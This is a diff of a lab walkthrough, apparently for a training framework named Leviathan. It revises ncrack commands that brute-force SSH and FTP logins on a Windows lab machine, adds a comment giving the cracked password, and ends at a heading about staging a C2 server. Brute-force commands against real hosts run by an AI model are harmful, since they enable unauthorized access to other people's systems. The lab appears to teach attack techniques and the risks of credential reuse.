@@ -236,10 +236,10 @@ Use `ncrack` with the `-iL` flag to point directly at Leviathan's hit list. The 
  
 ```bash
 ncrack -p 22 \
-  -U ~/BnB/Leviathan/leviathan_framework/wordlist/<users_wordlist_file> \
-  -P ~/BnB/Leviathan/leviathan_framework/wordlist/<passwords_wordlist_file> \
+  -U ~/BnB/Leviathan/leviathan_framework/wordlist/users.txt \
+  -P ~/BnB/Leviathan/leviathan_framework/wordlist/passwords.txt \
   -T 3 \
-  -iL ~/BnB/Leviathan/leviathan_framework/lists/<ssh_output_file>.txt \
+  -iL ~/BnB/Leviathan/leviathan_framework/assets/discovered/<ssh_output_file>.txt \
   -v
 ```
  
@@ -255,10 +255,8 @@ ncrack -p 22 \
 | `-v` | Verbose — print each attempt and surface discovered credentials immediately |
  
 When ncrack cracks the credential, the output will look like this:
- 
-```
-Discovered credentials for ssh on <WINDOWS_IP>:22 'victim' 'Password123!'
-```
+
+<img width="927" height="278" alt="image" src="https://github.com/user-attachments/assets/971d527c-e444-4928-ba0a-86edf8b30e8f" />
  
 ---
  
@@ -268,19 +266,17 @@ Repeat the same attack for FTP:
  
 ```bash
 ncrack -p 21 \
-  -U ~/BnB/Leviathan/leviathan_framework/wordlist/<users_wordlist_file> \
-  -P ~/BnB/Leviathan/leviathan_framework/wordlist/<passwords_wordlist_file> \
+  -U ~/BnB/Leviathan/leviathan_framework/wordlist/users.txt \
+  -P ~/BnB/Leviathan/leviathan_framework/wordlist/passwords.txt \
   -T 3 \
-  -iL ~/BnB/Leviathan/leviathan_framework/lists/<ftp_output_file>.txt \
+  -iL ~/BnB/Leviathan/leviathan_framework/assets/discovered/<ftp_output_file>.txt \
   -v
 ```
  
 Expected output:
  
-```
-Discovered credentials for ftp on <WINDOWS_IP>:21 'victim' 'Password123!'
-```
- 
+<img width="1027" height="242" alt="image" src="https://github.com/user-attachments/assets/b4cda2b3-022b-47d2-b80b-db91f579026a" />
+
 > [!NOTE]
 > Both services share the same credentials. This is a very common real-world misconfiguration known as **credential reuse**: a single weak password exposed on one protocol immediately compromises every other service that account touches. This is exactly why password managers and per-service credentials matter.
  
@@ -294,6 +290,7 @@ Log in using the credentials ncrack just cracked:
  
 ```bash
 ssh victim@<WINDOWS_IP>
+#The password is :  Password123! - as determined earlier.
 ```
  
 > [!IMPORTANT]
@@ -304,6 +301,9 @@ ssh victim@<WINDOWS_IP>
 ```dos
 powershell
 ```
+
+<img width="915" height="245" alt="image" src="https://github.com/user-attachments/assets/e91a96cc-10dd-4281-aa68-e6007ce16616" />
+
 
 ## Phase 3: Staging the C2 Server - Ubuntu VM
 
